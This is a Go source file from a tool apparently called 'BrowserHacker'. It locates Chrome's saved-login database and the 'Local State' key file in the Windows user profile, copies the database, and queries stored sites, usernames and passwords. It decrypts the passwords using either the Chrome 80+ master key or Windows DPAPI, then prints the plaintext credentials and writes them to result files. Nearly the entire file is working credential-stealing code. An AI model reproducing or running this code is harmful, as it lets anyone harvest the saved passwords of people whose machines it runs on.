package core

import (
	"BrowserHacker/crypher"
	"BrowserHacker/data"
	"database/sql"
	"fmt"
	"io"
	"os"
)

const (

	ChromeProfilePath = `/AppData/Local/Google/Chrome/User Data/Default/Login Data`
	ChromeKeyPath = `/AppData/Local/Google/Chrome/User Data/Local State`
)

type ChromeInit struct {
	ProfilePath string
	KeyPath string
}

var ChromeMainLogin string
var ChromeMainState string

func (c *ChromeInit)ReturnChromeLogin() string{
	if ChromeMainLogin != ""{
		return ChromeMainLogin
	}else{
		return os.Getenv("USERPROFILE") + ChromeProfilePath
	}

}

func (c *ChromeInit)ReturnChromeState() string{
	if ChromeMainState != ""{
		return ChromeMainState
	}else{
		return os.Getenv("USERPROFILE") + ChromeKeyPath
	}
}

func ConnSQLite(SQLiteRoot string) *sql.DB{
	// 连接sqlite数据库
	conn, err := sql.Open("sqlite3",SQLiteRoot)
	if err != nil {
		fmt.Println("Can't find Chrome Browser SQLite data")
		return nil
	}
	return conn
}

func QuerySQLite(db *sql.DB,query string) *sql.Rows{
	// 返回查询结果rows
	rows, err := db.Query(query)
	if err != nil {
		fmt.Println("Can't Query Chrome data in SQLite data")
		return nil
	}
	return rows
}

func CopyFile(source , dest string)bool{
	if source == ""||dest == "" {
		fmt.Println("souce or dest is nill")
		return false
	}
	// 打开源地址文件
	source_open, err := os.Open(source)
	if err != nil {
		return false
	}
	defer source_open.Close()
	// 打开目的地址文件
	dest_open, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY, 644)
	if err != nil {
		return false
	}
	defer dest_open.Close()

	_, copy_err := io.Copy(dest_open,source_open)
	if copy_err != nil{
		return false
	}else{
		return true
	}
}

func ChromeSQLiteV80() {
	fmt.Println("Chrome8.0")
	var Chrome ChromeInit
	var file *os.File
	if CopyFile(Chrome.ReturnChromeLogin(), "LocalDB") {
		conn := ConnSQLite("LocalDB")
		if data.FileName == true{
			file, _ = os.OpenFile("./result/Chrome8.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
		}
		if conn != nil {
			rows := QuerySQLite(conn, `SELECT origin_url, username_value, password_value FROM logins`)
			if rows != nil {
				for rows.Next() {
					var Url string
					var UserName string
					var PassWord []byte
					err := rows.Scan(&Url, &UserName, &PassWord)
					if err != nil {
						continue
					}
					masterKey, err := crypher.ReturnKeyFromLocalState(Chrome.ReturnChromeState())
					if err != nil {
						continue
					}
					DePwd, err := crypher.DecryptPwd(PassWord, masterKey)
					if UserName == "" || string(DePwd) == "" {
						continue
					} else {
						fmt.Println("[+]:",Url)
						fmt.Println("[UserName]:",UserName)
						fmt.Println("[Password]:",string(DePwd))
						fmt.Println("")
						if data.FileName == true {
							_,err  := file.WriteString("[+] "+ Url + "\n")
							if err != nil {
								fmt.Println(err)
								os.Exit(1)
							}
							_, err = file.WriteString("[UserName]: "+UserName+ "\n")
							if err != nil {
								fmt.Println(err)
								os.Exit(1)
							}
							_, err = file.WriteString("[PassWord]: "+string(DePwd)+ "\n")
							if err != nil {
								fmt.Println(err)
								os.Exit(1)
							}
							_, err = file.WriteString("\n")
							if err != nil {
								fmt.Println(err)
								os.Exit(1)
							}
						}
					}
				}
			}
		}
	}
}

func ChromeSQLite() {
	var Chrome ChromeInit
	var file *os.File
	if CopyFile(Chrome.ReturnChromeLogin(), "LocalDB") {
		conn := ConnSQLite("LocalDB")
		if conn != nil {
			if data.FileName == true{
				file, _ = os.OpenFile("./result/Chrome.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
			}
			rows := QuerySQLite(conn, `SELECT origin_url, username_value, password_value FROM logins`)
			if rows != nil {
				for rows.Next() {
					var Url string
					var UserName string
					var PassWord []byte
					err := rows.Scan(&Url, &UserName, &PassWord)
					if err != nil {
						continue
					}
					DePwd, err := crypher.WinDecypt(PassWord)
					if UserName == "" || string(DePwd) == "" {
						continue
					} else {

						fmt.Println("[+]:",Url)
						fmt.Println("[UserName]:",UserName)
						fmt.Println("[Password]:",string(DePwd))
						fmt.Println("")
						if data.FileName == true {
							_,err  := file.WriteString("[+] "+ Url + "\n")
							if err != nil {
								fmt.Println(err)
							}
							_, err = file.WriteString("[UserName]: "+UserName+ "\n")
							if err != nil {
								fmt.Println(err)
							}
							_, err = file.WriteString("[PassWord]: "+string(DePwd)+ "\n")
							if err != nil {
								fmt.Println(err)
							}
							_, err = file.WriteString("\n")
							if err != nil {
								fmt.Println(err)
							}
						}
					}
				}
			}
		}
	}
}